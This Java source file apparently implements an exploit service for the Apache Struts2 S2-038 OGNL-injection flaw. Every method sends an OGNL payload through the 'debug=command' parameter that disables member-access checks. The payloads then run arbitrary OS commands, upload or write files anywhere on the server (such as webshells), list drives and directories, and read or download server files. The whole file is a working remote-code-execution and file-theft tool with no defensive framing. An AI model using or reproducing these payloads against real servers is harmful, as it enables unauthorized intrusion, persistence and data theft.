package org.vti.service.impl;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.vti.service.ExploitService;
import org.vti.util.RequestUtil;

public class Struts2_S038_ExploitServiceImpl implements ExploitService {

	@Override
	public String getRealPath(String uri) throws Exception {
		
		//#context['com.opensymphony.xwork2.dispatcher.HttpServletRequest'] 可以取到值，但是无法执行方法
		String commandURL = URLEncoder.encode("#resp=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],"
				+ "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp.getWriter().println(#req.getRealPath(\"/\")),"
				+ "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");


		String requestURL = uri +"?debug=command&expression=" + commandURL;
		
		StringBuffer buf = new StringBuffer("\u7269\u7406\u5730\u5740\uff1a");

		buf.append(RequestUtil.getInstance().doRequest(requestURL));
		
		return buf.toString();
	}

	@Override
	public Map<String, String> getServerInfo(String uri, Map<String, String> properties) throws Exception {

		Map<String, String> echo = new LinkedHashMap<String, String>();
		
		for (Entry<String, String> entry : properties.entrySet()) {
			
			String commandURL = URLEncoder.encode("#resp=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],"
							+ "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
							+ "#pro=@java.lang.System@getProperty(\""+entry.getValue()+"\"),"
							+ "#resp.getWriter().println(#pro),"
							+ "#resp.getWriter().flush(),"
							+ "#resp.getWriter().close()", "UTF-8");

			String requestURL = uri + "?debug=command&expression=" + commandURL;

			echo.put(entry.getKey(), RequestUtil.getInstance().doRequest(requestURL));
		}

		return echo;

	}

	@Override
	public String doExecuteCMD(String uri, String cmd) throws Exception {
		
		String commandURL = URLEncoder.encode("#resp=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],"
				+ "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#a=@java.lang.Runtime@getRuntime().exec('"+cmd+"'),"
				+ "#s=new java.util.Scanner(#a.getInputStream()).useDelimiter(\"\\\\A\"),"
				+ "#msg=(#s.hasNext() ? #s.next() : \"\"),"
				+ "#resp.getWriter().println(#msg),"
				+ "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;
		

		BufferedReader reader = new BufferedReader(
				new InputStreamReader(RequestUtil.getInstance().getInputStream(requestURL)));

		String str = "";
		while (reader.ready()) {
			str += reader.readLine() + "\r\n";
		}
		return str;
	}

	@Override
	public boolean doUpload(String uri, String fileName, String content) throws Exception {

		fileName = "/" + fileName;
		content = content.replace("\"", "\\\"");
		
		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
				+ "#path=#req.getSession().getServletContext().getRealPath(\"/\")," 
				+ "#content=new java.lang.String(\"" + content + "\")," 
				+ "#file=new java.io.File(#path +\"" + fileName + "\"),"
				+ "#fos=new java.io.FileOutputStream(#file),"
				+ "#fos.write(#content.getBytes())," + "#fos.flush(),"
				+ "#fos.close()," 
				+ "#resp.getWriter().println(\"200\")," 
				+ "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;
		
		String message = RequestUtil.getInstance().doRequest(requestURL);

		if (message.equals("200")) {
			return true;
		} else {
			return false;
		}
	}

	@Override
	public boolean doCustomUplaod(String uri, String filePath, String content) throws Exception {

		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," 
				+ "#path=new java.lang.String(\""+ filePath.trim() + "\")," 
				+ "#content=new java.lang.String(\"" + content + "\"),"
				+ "#file=new java.io.File(#path)," 
				+ "#fos=new java.io.FileOutputStream(#file),"
				+ "#fos.write(#content.getBytes())," 
				+ "#fos.flush()," + "#fos.close(),"
				+ "#resp.getWriter().println(\"200\")," 
				+ "#resp.getWriter().flush()," + "#resp.getWriter().close()",
				"UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;

		String message = RequestUtil.getInstance().doRequest(requestURL);

		if (message.equals("200")) {
			return true;
		} else {
			return false;
		}
	}

	@Override
	public List<String> doGetFileSystem(String uri) throws Exception {

		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
						+ "#sys=@java.io.File@listRoots()," 
						+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
						+ "#resp.getWriter().println(#sys.length),"
						+ "#resp.getWriter().flush(),"
						+ "#resp.getWriter().close()","UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;

		int size = Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));

		List<String> list = new ArrayList<String>();

		for (int i = 0; i < size; i++) {

			String diskCmdURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
					+ "#sys=@java.io.File@listRoots()," 
					+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
					+ "#resp.getWriter().println(#sys[" + i + "])," 
					+ "#resp.getWriter().flush(),"
					+ "#resp.getWriter().close()","UTF-8");

			String diskURL = uri+ "?debug=command&expression=" + diskCmdURL;

			String diskName = RequestUtil.getInstance().doRequest(diskURL);

			list.add(diskName);
		}

		return list;

	}

	@Override
	public List<String> doListFiles(String uri, String path) throws Exception {

		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
				+ "#file=new java.io.File(\"" + path + "\")," 
				+ "#resp.getWriter().println(#file.listFiles().length),"
				+ "#resp.getWriter().flush()," 
				+ "#resp.getWriter().close()", "UTF-8");
		String requestURL = uri + "?debug=command&expression=" + commandURL;

		int size = Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));

		List<String> list = new ArrayList<String>();

		for (int i = 0; i < size; i++) {

			String diskCmdURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
					+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
					+ "#file=new java.io.File(\"" + path + "\")," 
					+ "#resp.getWriter().println(#file.listFiles()[" + i + "].getName())," 
					+ "#resp.getWriter().flush()," 
					+ "#resp.getWriter().close()", "UTF-8");

			String diskURL = uri + "?debug=command&expression=" + diskCmdURL;

			String diskName = RequestUtil.getInstance().doRequest(diskURL);

			list.add(diskName);
		}

		return list;

	}

	@Override
	public String doGetFileContent(String uri, String path) throws Exception {

		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," + "#path=new java.lang.String(\""
				+ path.trim() + "\")," + "#file=new java.io.File(#path),"
				+ "#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file))," + "#length=#file.length(),"
				+ "#buf=new byte[#length]," + "#dis.readFully(#buf),"
				+ "#resp.getWriter().println(new java.lang.String(#buf,\"ISO-8859-1\"))," + "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;

		InputStream inputStream = RequestUtil.getInstance().getInputStream(requestURL);

		BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

		StringBuffer buf = new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str + "\r\n");
		}
		reader.close();

		return buf.toString();
	}

	@Override
	public boolean doIsDirectory(String uri, String path) throws Exception {

		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
				+ "#path=new java.lang.String(\"" + path.trim() + "\")," 
				+ "#file=new java.io.File(#path),"
				+ "#resp.getWriter().println(#file.isDirectory())," 
				+ "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;

		String message = RequestUtil.getInstance().doRequest(requestURL);

		return Boolean.parseBoolean(message);
	}

	@Override
	public InputStream doDownload(String uri, String rpath) throws Exception {

		String commandURL = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," 
				+ "#path=new java.lang.String(\"" + rpath.trim() + "\")," 
				+ "#file=new java.io.File(#path),"
				+ "#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file))," 
				+ "#length=#file.length(),"
				+ "#buf=new byte[#length]," 
				+ "#dis.readFully(#buf),"
				+ "#resp.getWriter().println(new java.lang.String(#buf,\"ISO-8859-1\"))," 
				+ "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		String requestURL = uri +"?debug=command&expression=" + commandURL;

		InputStream inputStream = RequestUtil.getInstance().getInputStream(requestURL);

		return inputStream;

	}
}
